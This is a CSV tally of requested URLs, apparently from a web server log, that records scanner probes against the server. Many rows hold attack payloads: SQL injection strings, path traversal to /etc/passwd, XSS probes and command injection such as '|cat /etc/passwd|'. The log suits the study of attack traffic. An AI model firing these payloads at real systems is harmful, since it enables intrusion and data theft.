Frequency,Resource
1,FormHandler.cgi?realNikto=aaa&email=aaa&reply_message_template=%2Fetc%2Fpasswd&reply_message_from=sq%40example.com&redirect=http%3A%2F%2Fwww.example.com&recipient=sq%40example.com
1,dcshop/auth_data/auth_user_file.txt
3,/ccvv
1,webgais
2,/cgi-bin/formmail.pl
1,/download.php?sortby=&dcategory=<script>alert('Vulnerable')</script>
2,/article.cfm?id=1'<script>alert(document.cookie);</script>
1,/junk988.aspx%5C
1,mail/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,sojourn.cgi?cat=../../../../../../../../../../etc/password%00
1,plusmail
2,/cgi-bin/wrap
1,/main.php?basepath=%29%29%29%20OR%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x716a6b7671%2C%28SELECT%20%28ELT%288431%3D8431%2C1%29%29%29%2C0x71627a6a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29%20AND%20%28%28%281767%3D1767
1,/main.php?basepath=-5839%25%22%29%29%20OR%205746%3D5746%23
1,/cgi-bin/shop/auth_data/auth_user_file.txt
1,/main.php?basepath=-5558%29%29%29%20UNION%20ALL%20SELECT%209285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%2C9285%23
1,download.cgi
1,/ssdefs/
1,auktion.cgi?menue=../../../../../../../../../../etc/passwd
1,cgicso?query=<script>alert('Vulnerable')</script>
1,/scripts/httpodbc.dll
2,/cgi-bin/wwwwais
1,/main.php?basepath=%27%29%20AND%203267%3D7402%20AND%20%28%27YIsx%27%3D%27YIsx
1,/TvLBvkHh.show
1,/cgi-bin/diagnose.cgi
1,/TvLBvkHh.java
1,/modules.php?name=Your_Account&op=userinfo&uname=<script>alert('Vulnerable')</script>
2,/cgi-bin/cgiwrap/~sys
1,/main.php?basepath=-9601%29%29%29%20UNION%20ALL%20SELECT%206239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%2C6239%23
4,/index.php
1,/SiteServer/admin/findvserver.asp
1,"/forumdisplay.php?GLOBALS[]=1&f=2&comma=\"".system('id').\"""
1,calendar_admin.pl?config=|cat%20/etc/passwd|
1,/PMA/index.php
1,nph-emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/polycomftp/
1,/cgi-bin/retrieve_password.pl
2,cgiwrap/~nuucp
1,/main.php?basepath=-1670%29%29%29%20UNION%20ALL%20SELECT%205476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%2C5476%23
1,perl
1,nph-showlogs.pl?files=../../&filter=.*&submit=Go&linecnt=500&refresh=0
1,/sipphones/
1,/pages/htmlos/%3Cscript%3Ealert('Vulnerable');%3C/script%3E
1,/main.php?basepath=-5579%29%29%29%20UNION%20ALL%20SELECT%207167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%23
1,dumpenv.pl
2,/cgi-bin/cgiwrap/~unknown
1,YaBB/YaBB.cgi?board=BOARD&action=display&num=<script>alert('Vulnerable')</script>
1,test-cgi.exe?<script>alert(document.cookie)</script>
1,/phpMyAdmin/index.php
1,/cgi-bin/mt/mt-check.cgi
1,/TvLBvkHh.CGI
1,cgiwrap/~ZA3Z1
1,"/msadm/domain/index.php3?account_name=\""><script>alert('Vulnerable')</script>"
1,/exchange/lib/PAGEUTIL.INC
1,/phptonuke.php?filnavn=<script>alert('Vulnerable')</script>
1,/setup.nsf
1,cmd.exe?/c+dir
2,/cgi-bin/pbcgi.cgi?name=Joe%Camel&email=%3CSCRIPT%3Ealert%28%27Vulnerable%27%29%3B%3C%2FSCRIPT%3E
1,/exchange/lib/DELETE.INC
1,/main.php?basepath=-6114%29%29%29%20UNION%20ALL%20SELECT%209603%2C9603%2C9603%2C9603%2C9603%2C9603%2C9603%2C9603%2C9603%2C9603%2C9603%2C9603%2C9603%2C9603%2C9603%2C9603%2C9603%2C9603%2C9603%2C9603%2C9603%2C9603%2C9603%2C9603%2C9603%2C9603%2C9603%2C9603%2C9603%2C9603%2C9603%23
1,/file-that-is-not-real-2002.php3
1,/examples/cookie
1,/cgi-bin/testing_whatever
1,/cgi-bin/hello.bat?&dir+c:\\
1,SGB_DIR/superguestconfig
1,/exchange/lib/SESSION.INC
1,/themes/mambosimple.php?detection=detected&sitename=</title><script>alert(document.cookie)</script>
1,/phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script>
1,/TvLBvkHh.mdb
1,/main.php?basepath=%29%29%29%20OR%205986%3DBENCHMARK%285000000%2CMD5%280x4c597368%29%29%20AND%20%28%28%284359%3D4359
1,/index.php?top_message=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
1,/main.php?basepath=%25%27%29%29%20AND%202361%3D1288%23
1,/ews/ews/architext_query.pl
1,/TvLBvkHh.ASP
1,/comments.php?subject=<script>alert('Vulnerable')</script>&comment=<script>alert('Vulnerable')</script>&pid=0&sid=0&mode=&order=&thold=op=Preview
1,/index.jsp%00x
1,/cgi-bin/urlcount.cgi?%3CIMG%20SRC%3D%22%22%20ONERROR%3D%22alert%28%27Vulnerable%27%29%22%3E
1,/webcgi/
1,/cgi-bin/alienform.cgi?_browser_out=.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2Fetc%2Fpasswd
1,/cgi-bin/testcgi.exe
1,/readme.eml
1,/?mod=<script>alert(document.cookie)</script>&op=browse
1,/vgn/jsp/previewer
1,/TvLBvkHh.bat%7Cdir
1,/main.php?basepath=-8730%27%29%20AS%20acrx%20WHERE%205543%3D5543%20OR%201572%3D3981%23
1,date
1,/cgi-bin/fortune
1,/exchange/lib/JSUTIL.INC
2,/cgi-bin/cgiwrap/~sshd
1,/cgi-bin/search.cgi?..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini
1,blog/mt-load.cgi
1,/cgi-bin/uptime
1,/forums/modules/vwar/admin/config.php
1,/TvLBvkHh.LOG
2,/cgi-bin/cgiwrap/~www
1,retrieve_password.pl
1,/webcart-lite/orders/import.txt
1,/vider.php3
1,/main.php?basepath=-4932%29%29%29%20UNION%20ALL%20SELECT%209513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%23
1,/TvLBvkHh.genpopuplist
1,echo.bat
1,/cgi-bin/directorypro.cgi?want=showcat&show=../../../../../../../../../../etc/passwd%00
1,/examples/session
1,///etc/hosts
1,/cgi-bin/compatible.cgi
1,/modules.php?name=Stories_Archive&sa=show_month&year=2002&month=03&month_l=<script>alert('Vulnerable')</script>
1,/3rdparty/phpmyadmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../
8,/phpMyAdmin/scripts/setup.php
1,ans.pl?p=../../../../../usr/bin/id|&blah
1,mail
1,foxweb.dll
1,/TvLBvkHh.AP
1,/cgi-bin/perl.exe?-v
1,/nsn/..%5Cutil/attrib.bas
1,/cgi-bin/query?mss=%2e%2e/config
1,/main.php?basepath=-4471%22%29%29%29%20OR%205746%3D5746%23
1,/cgi-bin/input2.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
1,/error/HTTP_NOT_FOUND.html.var
1,/TvLBvkHh.backup
1,"/cgi-bin/viewcvs.cgi/viewcvs/viewcvs/?sortby=rev\""><script>alert('Vulnerable')</script>;"
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/?OpenServer
1,/phonecfg.cfg
2,wwwwais
1,/TvLBvkHh.pl%7Cdir
1,/TvLBvkHh.10:100
3,//pma/scripts/setup.php
1,/main.php?basepath=%22%29%20AND%206038%3D8981%23
1,/Mem/dynaform/FileExplorer.htm
1,/pmamy2/index.php
1,/nsn/..%5Cutil/rd.bas
1,/main.php?basepath=-2154%29%29%29%20UNION%20ALL%20SELECT%209232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%2C9232%23
1,test.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
1,/cgi-bin/test-cgi.exe?<script>alert(document.cookie)</script>
1,wrap
2,cgiwrap/~web
1,/main.php?basepath=-6756%29%29%29%20UNION%20ALL%20SELECT%205712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%2C5712%23
1,/asp/sqlqhit.asp
1,/~/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.asp
1,/c/winnt/system32/cmd.exe?/c+dir+/OG
1,/us/cgi-bin/sewse.exe?d:/internet/sites/us/sewse/jabber/comment2.jse+c:\boot.ini
1,/main.php?basepath=%29%29%29%20AND%20ROW%287564%2C1838%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a6b7671%2C%28SELECT%20%28ELT%287564%3D7564%2C1%29%29%29%2C0x71627a6a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%206871%20UNION%20SELECT%207055%20UNION%20SELECT%207075%20UNION%20SELECT%209322%29a%20GROUP%20BY%20x%29%20AND%20%28%28%287311%3D7311
1,/bigconf.cgi
1,/cgi-bin/newsdesk.cgi?t=../../../../../../../../../../etc/passwd
1,/main.php?basepath=%25%22%29%20AND%208016%3D6109%23
1,/main.php?basepath=%27%20AND%206237%3D9180%20AND%20%27EFvY%27%3D%27EFvY
1,cgitest.exe
1,"/upload.php?type=\""<script>alert(document.cookie)</script>"
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/cgi-bin/test2.pl?&lt;script&gt;alert('Vulnerable');&lt;/script&gt;
1,/cgi-bin/common/listrec.pl
1,/mambo/index.php?Itemid=7JxZx
1,/domlog.nsf
1,diagnose.cgi
1,/gxp2120/
1,/cgi-bin/ezboard.cgi
1,/TvLBvkHh.dbm
1,/TvLBvkHh.dbc
1,/IDSWebApp/IDSjsp/Login.jsp
5,/phpMyAdmin/_scripts/setup.php
1,view-source
1,/examples/servlets/index.html
1,"/vgn/login/1,501,,00.html?cookieName=x--\>"
1,/index.php3
1,/TvLBvkHh.x-shop
1,cal_make.pl?p0=../../../../../../../../../../etc/passwd%00
1,/shoppingdirectory/midicart.mdb
1,/asp/SQLQHit.asp
1,/TvLBvkHh.pdf
1,/scgi-bin/
1,/main.php?basepath=-8311%27%20OR%205746%3D5746%23
1,/cgi-bin/anacondaclip.pl?template=../../../../../../../../../../etc/passwd
1,/cgi-bin/query
2,cgiwrap/~www
1,webfind.exe?keywords=01234567890123456789
1,mt-static/mt-load.cgi
1,zml.cgi?file=../../../../../../../../../../etc/passwd%00
5,/admin/scripts/setup.php
2,/admin/PMA/index.php
1,/main.php?basepath=-4661%29%29%29%20UNION%20ALL%20SELECT%204904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%2C4904%23
1,/main.php?basepath=-6461%29%20OR%209948%3D3079%23
1,/main.php?basepath=-5345%29%29%29%20UNION%20ALL%20SELECT%201776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%2C1776%23
1,/TvLBvkHh.00RelNotes
5,/mysql/scripts/setup.php
1,/modules.php?op=modload&name=Sections&file=index&req=viewarticle&artid=
1,/vgn/ac/index
1,/nsn/..%5Cutil/send.bas
1,/main.php?basepath=-3538%29%29%29%20UNION%20ALL%20SELECT%205114%2C5114%2C5114%2C5114%2C5114%2C5114%2C5114%2C5114%2C5114%2C5114%2C5114%2C5114%2C5114%2C5114%2C5114%2C5114%2C5114%2C5114%2C5114%2C5114%2C5114%2C5114%2C5114%2C5114%2C5114%23
1,/TvLBvkHh.xtp
1,/cgi-bin/.cobalt/alert/service.cgi?service=<script>alert('Vulnerable')</script>
1,/main.php?basepath=-8490%22%29%29%29%20OR%205746%3D5746%23
1,/main.php?basepath=-3153%29%29%29%20UNION%20ALL%20SELECT%202978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%2C2978%23
2,/index.aspx
1,/TvLBvkHh
1,/vgn/errors
1,/cgi-bin/scoadminreg.cgi
1,/wp-includes/SimplePie/ogi.exe
1,lastlines.cgi?process
1,/index.php?option=search&searchword=<script>alert(document.cookie);</script>
1,/main.php?basepath=-6438%27%20OR%205746%3D5746%23
1,/main.php?basepath=%22%29%20AS%20jdxd%20WHERE%204321%3D4321%20AND%201916%3D1916%23
1,/cgi-bin/webplus?script=../../../../../../../../../../etc/passwd
2,/admin/phpMyAdmin/index.php
1,/main.php?basepath=%29%29%29%20RLIKE%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29bPku%29%20AND%20%28%28%285216%3D5216
1,/scripts/samples/details.idc
1,/%3F.jsp
1,/cgi-bin/index.js0x70
1,"/phpBB/viewtopic.php?t=17071&highlight=\"">\""<script>javascript:alert(document.cookie)</script>"
1,/base/webmail/readmsg.php?mailbox=../../../../../../../../../../../../../../etc/passwd&id=1
1,/main.php?basepath=%29%20AND%203265%3D9406%23
1,/showcat.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt;
1,/nph-showlogs.pl?files=../../../../../../../../etc/&filter=.*&submit=Go&linecnt=500&refresh=0
2,/cgi-bin/cgiwrap/~adm
1,/TvLBvkHh.bak
1,/TvLBvkHh.bat
1,/cgi-bin/zml.cgi?file=../../../../../../../../../../etc/passwd%00
1,webmail/html/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/TvLBvkHh.bas
1,/cgi-bin/db4web_c/dbdirname//etc/passwd
1,/TvLBvkHh.gif
1,/main.php?basepath=%29%29%29%20OR%20SLEEP%285%29%20AND%20%28%28%287497%3D7497
1,/main.php?basepath=-2872%22%20OR%205746%3D5746%23
1,/supporter/index.php?t=updateticketlog&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;
1,/main.php?basepath=-3245%29%29%29%20UNION%20ALL%20SELECT%204874%2C4874%2C4874%2CCONCAT%280x716a6b7671%2C0x78776c6a7a445575694b516763654a4449554c4d4d7254455369725546766261446c4e4c67596c6d%2C0x71627a6a71%29%2C4874%23
1,/vgn/performance/TMT/Report/XML
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/cgi-bin/mkplog.exe
1,/phpMyAdmin/phpMyAdmin/index.php
1,"athcgi.exe?command=showpage&script='],[0,0]];alert('Vulnerable');a=[['"
1,ws_ftp.ini
1,/shopping300.mdb
1,/cgi-bin/viewcvs.cgi/viewcvs/?cvsroot=<script>alert('Vulnerable')</script>
1,/cbms/realinv.php
1,/TvLBvkHh.bas:ShowVolume
1,/search/htx/sqlqhit.asp
1,/spa/
1,finger.pl
1,/typo3conf/
1,viralator.cgi
1,/main.php?basepath=-3944%22%29%20AS%20swmU%20WHERE%208221%3D8221%20OR%206771%3D3567%23
1,/cgi-bin/guestbook.pl
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/TvLBvkHh.exe%7Cdir
1,/TvLBvkHh.listprint
1,"/modules/Forums/bb_smilies.php?bgcolor1=\""><script>alert('Vulnerable')</script>"
1,/main.php?basepath=%60%29%20WHERE%209520%3D9520%20AND%204390%3D8588%23
1,/TvLBvkHh.iso-ru
1,/hidden.nsf
1,/main.php?basepath=%22%20OR%20NOT%204288%3D4288%23
1,/trace.axd
1,/cfide/Administrator/startstop.html
1,/main.php?basepath=%22%29%20AS%20AKME%20WHERE%202669%3D2669%20AND%206548%3D7026%23
1,/TvLBvkHh.cmd
1,smartsearch.cgi?keywords=|/bin/cat%20/etc/passwd|
1,visadmin.exe
1,badmin.cgi
1,/cgi-bin/visadmin.exe
1,/COM
1,/view_source.jsp
1,/nsn/fdir.bas:ShowVolume
1,/cgi-bin/calendar_admin.pl?config=|cat%20/etc/passwd|
1,search.pl?form=../../../../../../../../../../etc/passwd%00
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
3,/w00tw00t.at.blackhats.romanian.anti-sec:)
1,/cgi-915/
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/add_user.php
1,/main.php?basepath=-2775%27%29%29%20OR%205746%3D5746%23
1,/phpmyadmin0/index.php
1,guestbook.pl
1,/cgi-bin/auth_data/auth_user_file.txt
1,/TvLBvkHh.csc
1,listrec.pl
1,"/cgi-bin/login.pl?course_id=\"">&lt;SCRIPT&gt;alert('Vulnerable')&lt;/SCRIPT&gt;"
1,"/Page/1,10966,,00.html?var=<script>alert('Vulnerable')</script>"
1,/main.php?basepath=%29%20OR%20NOT%204288%3D4288%23
1,/TvLBvkHh.PRINT
1,/TvLBvkHh.csp
1,blog/mt.cfg
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/cgi-bin/empower?DB=whateverwhatever
1,/main.php?basepath=%29%29%29%20RLIKE%20SLEEP%285%29%20AND%20%28%28%286597%3D6597
1,/main.php?basepath=-7605%22%20OR%201500%3D4278%23
1,/cfdocs/exampleapp/email/getfile.cfm?filename=c:\boot.ini
1,/main.php?basepath=%29%29%29%20ORDER%20BY%201%23
1,/modules/Forums/bb_smilies.php?Default_Theme=<script>alert('Vulnerable')</script>
1,/main.php?basepath=-9449%29%29%29%20UNION%20ALL%20SELECT%203673%2CCONCAT%280x716a6b7671%2C0x4157596c664d544b6962%2C0x71627a6a71%29%2C3673%2C3673%2C3673%23
1,/guestbook/guestbook.html
1,/VoIP_SIP.html
